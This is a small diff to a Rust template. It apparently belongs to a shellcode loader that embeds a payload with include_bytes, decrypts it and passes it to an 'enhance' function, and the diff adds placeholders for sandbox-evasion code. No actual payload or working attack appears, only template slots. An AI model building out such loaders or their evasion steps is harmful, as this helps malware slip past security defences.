@@ -11,6 +11,8 @@ use std::include_bytes;
 
 {{IMPORTS}}
 
+{{SANDBOX_IMPORTS}}
+
 {{DECRYPTION_FUNCTION}}
 
 fn enhance(buf: Vec<u8>) {
@@ -61,13 +63,15 @@ fn enhance(buf: Vec<u8>) {
 }
 
 fn main() {
+    {{SANDBOX}}
+    
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
 
     let mut vec: Vec<u8> = Vec::new();
     for i in buf.iter() {
         vec.push(*i);
     }
-
+    
     {{MAIN}}
 
     enhance(vec.clone());
